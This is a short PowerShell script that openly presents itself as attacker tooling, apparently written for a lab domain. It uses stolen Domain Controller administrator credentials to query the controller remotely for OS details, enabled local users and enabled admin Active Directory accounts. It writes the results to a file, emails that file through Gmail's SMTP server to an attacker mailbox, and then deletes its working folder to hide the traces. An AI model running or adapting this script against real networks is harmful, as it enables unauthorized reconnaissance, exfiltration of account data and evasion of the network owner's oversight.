<#
This script will be used after the attacker has
received the credentials for the Domain Controller Server.

The script gathers information of the Domain Controller 
from the workstation, and send the info to the atacker via mail.

#>



$UserName = "Dunder\Administrator"
$Password = "1234Passord"

$SecPw    = ConvertTo-SecureString $Password -AsPlainText -Force

$Creds    = New-Object Management.Automation.PSCredential($UserName, $SecPw)




$Path = New-Item -Path "C:\HackedAD\RemotePCInfo.txt" -ItemType File -Force


$RemoteInfo = Invoke-Command -ComputerName DC -Credential $Creds -ScriptBlock {

    Get-ComputerInfo -Property OsName,OsVersion,OsBuildNumber

    Get-LocalUser | Where-Object {$_.Enabled -eq 'True'}

    Get-ADUser -Filter * -SearchBase "DC=Dunder,DC=local" | Where-Object {$_.DistinguishedName -match "CN=Admin*" -and $_.Enabled -eq 'True'} | Format-List -Property Name,SamAccountName
}

Start-Sleep -Seconds 5

Out-File -FilePath C:\HackedAD\RemotePCInfo.txt -InputObject $RemoteInfo




     # Send txt file with info via mail

            Start-Sleep -Seconds 5

            $username   = 'totallynothingshady@gmail.com'
            $password   = 'SecurePassword1234'
            $secstr     = New-Object -TypeName System.Security.SecureString
            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}


            # All the files in the temporary directory added as attachment
            [array]$Attachments = Get-ChildItem "C:\HackedAD" *.*
            
        
            $Msg = @{
                from       = "totallynothingshady@gmail.com"
                to         = "totallynothingshady@gmail.com"
                subject    = "Remote Computer Info"
                smtpserver = "smtp.gmail.com"
                port       = "587"
                body       = "Remote Computer Info"
                credential = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
                usessl     = $true
                verbose    = $true
                Attachments = $Attachments.fullname
            }



            Send-MailMessage @Msg
  


    # Delete the temporary folder with text file and screencapture

     Start-Sleep -Seconds 10

     $Dir = "C:\HackedAD"
     Remove-Item -LiteralPath $Dir -Force -Recurse -ErrorAction SilentlyContinue